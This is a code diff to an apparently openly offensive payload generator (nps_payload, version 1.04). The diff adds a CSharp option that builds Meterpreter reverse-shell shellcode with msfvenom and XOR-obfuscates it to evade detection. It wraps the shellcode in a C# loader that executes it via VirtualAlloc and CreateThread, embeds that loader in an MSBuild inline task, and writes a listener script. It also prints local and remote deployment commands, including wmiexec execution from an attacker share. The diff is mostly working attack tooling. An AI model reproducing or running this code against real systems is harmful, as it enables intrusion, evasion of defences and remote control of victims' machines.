@@ -1,9 +1,11 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 # Written by Larry Spohn (@Spoonman1091)
 # Payload written by Ben Mauch (@Ben0xA) aka dirty_ben
 # TrustedSec, LLC
 # https://www.trustedsec.com
+# CSharp payload by Franci Šacer (@francisacer1)
 
 from __future__ import print_function
 import os
@@ -25,7 +27,7 @@ class bcolors:
 listener_ip = "127.0.0.1"
 
 # Configure for auto detection of local IP Address
-local_interface = "ens33"
+local_interface = "eth0"
 
 try:
     raw_input          # Python 2
@@ -130,19 +132,18 @@ def generate_msbuild_nps_msf_payload():
     <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
+        using System;
+        using System.Collections.ObjectModel;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
 
-          using System;
-      using System.Collections.ObjectModel;
-      using System.Management.Automation;
-      using System.Management.Automation.Runspaces;
-      using Microsoft.Build.Framework;
-      using Microsoft.Build.Utilities;
-
-      public class nps : Task, ITask
+        public class nps : Task, ITask
         {
             public override bool Execute()
             {
-              string cmd = "%s";
+                string cmd = "%s";
 
                 PowerShell ps = PowerShell.Create();
                 ps.AddScript(Base64Decode(cmd));
@@ -167,12 +168,12 @@ def generate_msbuild_nps_msf_payload():
             }
 
             public static string Base64Encode(string text) {
-           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
-        }
+                return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
 
-        public static string Base64Decode(string encodedtext) {
-            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
-        }
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
         }
         ]]>
       </Code>
@@ -189,6 +190,204 @@ def generate_msbuild_nps_msf_payload():
   print("3. Hack the Planet!!")
 
   sys.exit(0)
+
+def generate_msfvenom_raw_payload(msf_payload):
+  global listener_ip
+
+  if (listener_ip == "127.0.0.1"):
+    local_ip = get_local_ip(local_interface)
+    listener_ip = raw_input("Enter Your Local IP Address (%s): " % local_ip) or local_ip
+
+  # Get listern port from user
+  msf_port = raw_input("Enter the listener port (443): ") or 443
+
+  # Generate PSH payload
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating RAW shellcode Payload...")
+  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f raw -o shell.raw" % (msf_payload,listener_ip,msf_port))
+
+  # Generate resource script
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
+  msf_resource_file = open("msbuild_nps.rc", "a")
+  payload_listener = "\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j -z" % (msf_payload, listener_ip, msf_port)
+  msf_resource_file.write(payload_listener)
+  msf_resource_file.close()
+
+def encode_csharppayload(payload_file):
+  global csharp_payload
+
+  raw_file = open(payload_file, "rb")
+  raw_b64 = base64.b64encode(raw_file.read())
+  from itertools import cycle, izip
+  import random, string
+  key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(20))
+  cryptedMessage = ''.join(chr(ord(c)^ord(k)) for c,k in izip(raw_b64, cycle(key)))
+  str_shellcode = base64.b64encode(cryptedMessage.encode('utf-8'))
+  raw_file.close()
+
+  # Create launcher class
+  launcher = """
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+public class ClassExample
+{
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    [DllImport("kernel32")]
+    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(
+        UInt32 lpThreadAttributes,
+        UInt32 dwStackSize,
+        UInt32 lpStartAddress,
+        IntPtr param,
+        UInt32 dwCreationFlags,
+        ref UInt32 lpThreadId
+    );
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    public void Execute() {
+        string raw = @"%s";
+        byte[] shellcode = Convert.FromBase64String(xorIt("%s", Base64Decode(raw)));
+        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+        IntPtr hThread = IntPtr.Zero;
+        UInt32 threadId = 0;
+        IntPtr pinfo = IntPtr.Zero;
+        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+
+    public static string xorIt(string key, string input)
+    {
+        StringBuilder sb = new StringBuilder();
+        for(int i=0; i < input.Length; i++)
+            sb.Append((char)(input[i] ^ key[(i %% key.Length)]));
+        String result = sb.ToString();
+        return result;
+    }
+
+    public static string Base64Encode(string text) {
+       return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+    }
+
+    public static string Base64Decode(string encodedtext) {
+	    return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+    }
+}""" % (str_shellcode, key)
+
+  launcher_b64 = base64.b64encode(launcher.encode('utf-8'))
+  csharp_payload = launcher_b64
+  return launcher_b64
+
+def generate_msbuild_nps_msf_csharp_payload():
+  global listener_ip
+  global csharp_payload
+
+  # Delete old resource script
+  if os.path.exists("msbuild_nps.rc"):
+    os.remove("msbuild_nps.rc")
+
+  # Initilize new resource script
+  msf_resource_file = open("msbuild_nps.rc", "a")
+  msf_resource_file.write("use multi/handler")
+  msf_resource_file.close()
+
+  # Display options to the user
+  print("\nPayload Selection:")
+  print("\n\t(1)\twindows/meterpreter/reverse_tcp")
+  print("\t(2)\twindows/meterpreter/reverse_http")
+  print("\t(3)\twindows/meterpreter/reverse_https")
+
+  options = {1: "windows/meterpreter/reverse_tcp",
+             2: "windows/meterpreter/reverse_http",
+             3: "windows/meterpreter/reverse_https"
+  }
+
+  # Generate payload
+  try:
+    msf_payload = input("\nSelect payload: ")
+    generate_msfvenom_raw_payload(options.get(msf_payload))
+    encode_csharppayload("shell.raw")
+
+  except KeyError:
+    pass
+
+  # Create msbuild_nps.xml
+  msbuild_nps_file = open("msbuild_nps.xml", "w")
+  msbuild_nps_file.write("""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->
+  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
+  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
+  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="npscsharp">
+   <nps />
+  </Target>
+  <UsingTask
+    TaskName="nps"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class nps : Task, ITask
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("hey");
+                string cmd = "%s";
+                CSharpCodeProvider nps = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("ClassExample");
+                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>""" % csharp_payload)
+
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.xml")
+  print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
+  print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
+  print("  a. Local File Deployment:\n" + bcolors.WHITE + "    - %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml" + bcolors.ENDC)
+  print("  b. Remote File Deployment:\n" + bcolors.WHITE + "    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml" + bcolors.ENDC)
+  print("3. Hack the Planet!!")
+
+  sys.exit(0)
+
 
 def generate_msbuild_nps_msf_hta_payload():
   global psh_payload
@@ -392,17 +591,19 @@ def main():
 |_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
       |_|     |_____|_|         |__/
 
-                       v1.03
+                       v1.04
 """)
 
   while(1):
     # Display options to the user
     print("\n\t(1)\tGenerate msbuild/nps/msf payload")
-    print("\t(2)\tGenerate msbuild/nps/msf HTA payload")
+    print("\t(2)\tGenerate msbuild/nps/msf CSharp payload")
+    print("\t(3)\tGenerate msbuild/nps/msf HTA payload")
     print("\t(99)\tQuit")
 
     options = {1: generate_msbuild_nps_msf_payload,
-               2: generate_msbuild_nps_msf_hta_payload,
+               2: generate_msbuild_nps_msf_csharp_payload,
+               3: generate_msbuild_nps_msf_hta_payload,
                99: quit,
     }
     try:
